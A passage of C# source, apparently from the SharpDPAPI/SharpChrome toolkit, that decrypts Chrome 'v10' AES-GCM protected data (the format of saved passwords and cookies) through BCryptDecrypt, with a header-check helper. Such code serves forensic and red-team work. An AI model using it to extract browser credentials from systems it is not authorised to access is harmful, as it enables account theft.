                    subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                    Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
                    pData = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * dwData.Length);

                    try
                    {
                        Marshal.Copy(dwData, 0, pData, dwData.Length);
                        BCrypt.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                        info.pbNonce = (byte*)(new IntPtr(pData.ToInt64() + DPAPI_CHROME_UNKV10.Length));
                        info.cbNonce = 12;
                        info.pbTag = info.pbNonce + dwData.Length - (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                        info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                        dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                        dwDataOut = new byte[dwDataOutLen];

                        fixed (byte* pDataOut = dwDataOut)
                        {
                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, (void*)&info, null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                        }

                        if (ntStatus != 0)
                        {
                            Console.WriteLine("[X] Error : {0}", SharpDPAPI.Interop.GetLastError());
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Exception : {0}", ex.Message);
                    }
                    finally
                    {
                        if (pData != null && pData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pData);
                    }
                }
                else
                {
                    Console.WriteLine("[X] Data header not equal to DPAPI_CHROME_UNKV10");
                }
            }
            return dwDataOut;
        }

        public static bool HasV10Header(byte[] data)
        {
            return SharpDPAPI.Helpers.ByteArrayEquals(data, 0, DPAPI_CHROME_UNKV10, 0, 3);
        }
    }
}
